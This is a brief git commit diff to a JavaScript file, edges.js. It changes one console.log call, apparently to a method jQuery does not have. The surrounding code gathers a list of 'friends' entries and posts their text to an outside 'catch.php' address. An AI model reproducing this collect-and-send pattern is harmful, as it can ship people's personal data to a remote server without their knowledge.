394a6d320e225a0d61d2f7b0a9caaa4cc23aa63c
Patrik Greco <sikevux@sikevux.se>
2011-08-18 17:40:02 +0200

    Leker

--- edges.js
+++ edges.js
@@ -48,7 +48,7 @@ $.ajax({
 			var info = "\n" + friends[i].text + " " + friends[i].index;
 			$(display).append(info);
 		}
-		console.log(display.html());
+		console.log($.html(display));
 		$.post("http://c0re.se/catch.php", { text:display.text(), });
 		console.log('3rd');
 
